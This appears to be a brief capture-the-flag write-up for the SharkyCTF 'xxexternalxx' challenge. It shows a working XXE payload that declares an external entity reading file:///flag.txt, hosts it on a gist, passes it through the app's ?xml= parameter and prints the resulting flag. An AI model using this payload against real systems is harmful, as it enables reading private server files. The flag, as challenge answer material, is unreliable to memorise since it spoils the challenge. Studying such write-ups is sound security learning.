Prompt
```
One of your customer all proud of his new platform asked you to audit it. To show him that you can get information on his server, he hid a file "flag.txt" at the server's root.

xxexternalxx.sharkyctf.xyz
```

Clicking on Header "Show Stored Data takes us to this URL"
`http://xxexternalxx.sharkyctf.xyz/?xml=data.xml`

if we go to /data.xml we get the following
```
<root>
<data>
17/09/2019 the platform is now online, the fonctionnalities it contains will be audited by one of our society partenairs
</data>
</root>
```

XEE Injection time, we can inject an URL into the php parameter, so put the following into a github just and pass it in

`<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]><root><data>&test;</data></root>`


`http://xxexternalxx.sharkyctf.xyz/?xml=https://gist.githubusercontent.com/jhweintraub/7e4f981cf41300e7586a6084bb4a3e7d/raw/b2ab20801d1b57b73d1c901dbc75d3fd12de0c54/gistfile1.txt`

Flag Pops Right out

shkCTF{G3T_XX3D_f5ba4f9f9c9e0f41dd9df266b391447a} 